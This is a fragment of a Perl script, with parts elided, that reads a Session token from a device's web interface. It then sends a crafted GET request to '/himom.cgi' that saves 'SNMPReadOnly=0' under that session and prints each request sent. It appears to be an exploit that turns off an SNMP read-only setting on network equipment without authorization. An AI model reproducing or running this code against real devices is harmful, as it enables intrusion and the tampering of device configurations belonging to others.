    ...
    while (<$remote>) {
        if (/Session=(.*)\"/)
        {
            ...
            $remote1->autoflush(1);
                    ...
                    $remote2->autoflush(1);
                    print $remote2 "GET /himom.cgi?ok=Save+Changes&1533:SNMPReadOnly=0&Session=$sessid HTTP/1.1".$EOL;
                    print $remote2 'User-Agent: Mozilla/5.0'. $EOL;
                    print $remote2 $EOL;
                    print $remote2 $EOL;
                    print "$host: GET /himom.cgi?ok=Save+Changes&1533:SNMPReadOnly=0&Session=$sessid HTTP/1.1\n";
            last;
        }
    }
}
